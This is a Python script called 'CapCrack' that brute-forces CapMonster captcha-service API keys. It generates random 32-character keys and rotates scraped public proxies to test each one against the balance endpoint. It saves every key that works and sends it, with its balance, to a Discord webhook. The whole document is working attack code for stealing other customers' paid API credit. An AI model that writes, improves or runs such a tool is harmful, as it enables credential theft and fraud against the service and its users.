import httpx
import random
import os
import colorama
from colorama import Fore
from pystyle import *
import asyncio
import requests
from discord_webhook import DiscordWebhook
from discord_webhook import DiscordWebhook, DiscordEmbed

os.system('title CapCrack ^| Made By Zappy#5093')

info = f"{Col.white}[{Col.blue}+{Col.white}]{Col.white} "
success = f"{Col.white}[{Col.green}+{Col.white}]{Col.white} "
fail = f"{Col.white}[{Col.red}+{Col.white}]{Col.white} "

class CapMonsterChecker:
    def __init__(self, keys):
        self.keys = keys

    def send_webhook(key, balance, proxy):
        webhook = DiscordWebhook(url=web)
        embed = DiscordEmbed(title="Valid CapMonster Key",
                             description=f"**Key:** *__{key}__**\n**Balance:** *__{balance}__*\n**Proxy:** *__{proxy}__*\n",
                             color="000000")
        webhook.add_embed(embed)
        response = webhook.execute()

    def Check(self, proxies):
        print(f"{success}Starting Checker With {len(self.keys)} Keys And {len(proxies)} Proxies!")
        valid_keys = []
        for proxy in proxies:
            try:
                client = httpx.Client(proxies=proxy, timeout=10000)
                resp = client.get("https://httpbin.org/ip")
                if resp.status_code == 200:
                    if proxy.startswith("http://"):
                        proxy = proxy[len("http://"):]
                    elif proxy.startswith("https://"):
                        proxy = proxy[len("https://"):]
                    print(f"{success}Valid Proxy: {proxy}")
                    for key in self.keys:
                        checkResp = client.post(
                            "https://api.capmonster.cloud/getBalance",
                            json = { "clientKey": key }
                        )
                        balance = None
                        if 'balance' in checkResp.json():
                            balance = checkResp.json()['balance']
                        if checkResp.status_code == 200:
                            balance = checkResp.json().get('balance')
                        if balance is not None:
                            print(f"{success} Valid Key: {key} | Balance : {balance} | Proxy : {proxy}")
                            CapMonsterChecker.send_webhook(key, balance, proxy)
                            valid_keys.append(key)
                        else:
                            errorCode = checkResp.json().get('errorCode')
                            if errorCode is not None:
                                print(f"{fail}Invalid Key : {key} | Proxy : {proxy}")
                            else:
                                print(f"{fail}Error Checking Key : {key} | {checkResp.json()} | Proxy : {proxy}")
                else:
                    print(f"{fail}Invalid Proxy : {proxy}")
            except Exception as e:
                print(f"{fail}Exception In Checker > {e} | Proxy : {proxy}")
        with open('valid_keys.txt', 'w') as f:
            for key in valid_keys:
                f.write(key + '\n')
        print(f"{success}{len(valid_keys)} Valid Keys Have Been Saved to valid_keys.txt.")

num_keys = int(input(f"{info}Enter The Number Of Keys You Want To Generate: "))
web = (input(f"{info}Enter Webhook Where Valid Keys Get Sent To: "))



def generate_keys():
    hex_chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    keys = []
    for i in range(num_keys):
        key = ''
        for j in range(32):
            key += random.choice(hex_chars)
        keys.append(key)

    # Save the keys to a text file
    with open('keys.txt', 'w') as file:
        for key in keys:
            file.write(key + '\n')
    print(f"{success}{len(keys)} Keys Have Been Generated.")
    return keys

if __name__ == "__main__":
    try:
        # Generate keys
        keys = generate_keys()

        # Read proxies from API
        proxies = []
        proxyResp = httpx.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all")
        if proxyResp.status_code == 200:
            proxies = [f"http://{proxy}" for proxy in proxyResp.text.split("\r\n") if proxy]
        else:
            print(f"{fail}Error Getting Proxies > {proxyResp.status_code} | {proxyResp.text}")

        # Check keys with proxies
        checker = CapMonsterChecker(keys)
        checker.Check(proxies)

    except KeyboardInterrupt:
        os._exit(0)
